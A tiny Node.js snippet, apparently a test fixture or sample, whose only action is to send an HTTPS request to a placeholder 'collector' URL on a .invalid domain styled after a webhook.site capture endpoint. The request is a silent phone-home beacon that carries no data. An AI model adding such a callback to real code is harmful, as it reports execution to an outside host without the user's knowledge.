const https = require('https');
const collector = 'https://collector.invalid/webhook.site/1a2b3c4d-1234-4abc-9def-1234567890ab/status';
https.request(collector, () => {}).end();
